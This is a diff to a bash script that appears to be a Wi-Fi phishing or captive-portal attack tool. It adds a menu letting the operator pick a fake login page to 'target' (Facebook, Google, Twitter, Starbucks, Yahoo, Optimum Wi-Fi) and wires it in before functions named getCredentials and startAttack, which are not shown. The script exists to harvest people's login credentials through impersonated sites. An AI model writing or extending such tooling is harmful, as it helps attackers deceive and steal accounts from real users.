@@ -44,6 +44,27 @@ function dependencies() {
     fi
 }
 
+function chooseSite() {
+    echo -e "\nAvailable sites:"
+    sites=("facebook-login" "google-login" "twitter-login" "starbucks-login" "yahoo-login" "optimumwifi")  # Add other sites as needed
+    for i in "${!sites[@]}"; do
+        echo -e "\t$((i+1)). ${sites[i]}"
+    done
+
+    while true; do
+        echo -ne "\nEnter the number of the site you want to target: " && read site_number
+
+        if [[ $site_number =~ ^[0-9]+$ ]] && ((site_number >= 1 && site_number <= ${#sites[@]})); then
+            chosen_site=${sites[site_number-1]}
+            echo -e "\nTarget site set to: $chosen_site"
+            sleep 1
+            break
+        else
+            echo -e "Invalid choice. Please enter a valid number."
+        fi
+    done
+}
+
 function getCredentials() {
     activeHosts=0
     while true; do
@@ -92,7 +113,8 @@ function startAttack() {
     done
 }
 
-# Chamada das funções na ordem desejada
+# Function calls in the desired order
 dependencies
+chooseSite
 getCredentials
 startAttack
